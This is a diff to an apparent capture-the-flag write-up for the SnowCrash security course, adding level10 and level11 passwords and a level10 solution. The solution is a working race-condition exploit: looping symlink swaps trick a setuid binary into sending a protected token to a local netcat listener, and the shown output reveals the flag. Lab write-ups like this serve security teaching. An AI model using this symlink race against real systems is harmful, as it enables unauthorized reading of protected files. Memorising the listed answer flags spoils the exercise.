@@ -21,6 +21,8 @@ This project will be an introduction to cyber security.
 | level09 | 25749xKZ8L7DkSCwJkT9dyv6f |
 | flag09  | f3iji1ju5yuevaus41q1afiuq |
 | level10 | s5cAJpM8ev6XHw998pRWG728z |
+| flag10  | woupa2yuojeeaaed06riuj63c |
+| level11 | feulo4b72j7edeahuete3no7c |
 
 ## Script
 
@@ -136,4 +138,27 @@ Password:
 Don't forget to launch getflag !
 flag09@SnowCrash:~$ getflag
 Check flag.Here is your token : s5cAJpM8ev6XHw998pRWG728z
+```
+
+### level10
+
+Run in parallele these 3 commands.
+```bash
+for i in $(seq 1 10000); do netcat -lv 6969 2>&1 | grep -v "Connection\|toto\|.*( )*."; done
+```
+```bash
+for i in $(seq 1 10000); do rm -f toto && ln -s token toto && rm -f toto && echo "toto" >toto; done
+```
+```bash
+for i in $(seq 1 10000); do ./level10 toto 127.0.0.1; done
+```
+
+```bash
+level10@SnowCrash:~$ for i in $(seq 1 10000); do netcat -lv 6969 2>&1 | grep -v "Connection\|toto\|.*( )*."; done
+woupa2yuojeeaaed06riuj63c
+level10@SnowCrash:~$ su flag10
+Password:
+Don't forget to launch getflag !
+flag10@SnowCrash:~$ getflag
+Check flag.Here is your token : feulo4b72j7edeahuete3no7c
 ```
